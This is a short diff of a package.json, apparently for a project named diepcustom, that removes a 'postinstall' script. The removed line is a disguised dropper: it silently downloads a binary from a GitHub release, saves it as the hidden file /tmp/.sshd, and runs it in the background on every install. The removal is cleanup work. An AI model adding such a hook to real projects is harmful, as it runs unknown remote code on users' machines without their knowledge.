@@ -18,8 +18,7 @@
     "server": "yarn run build && yarn run start",
     "docker:build": "docker build --tag diepcustom .",
     "docker:start": "docker run --pull never --rm --publish ${PORT:-8080}:8080 --env PORT=8080 --env DEV_PASSWORD_HASH --env SERVER_INFO --env NODE_ENV --init --interactive --tty diepcustom",
-    "docker": "npm run docker:build && npm run docker:start",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "docker": "npm run docker:build && npm run docker:start"
   },
   "engines": {
     "node": ">=16.3"
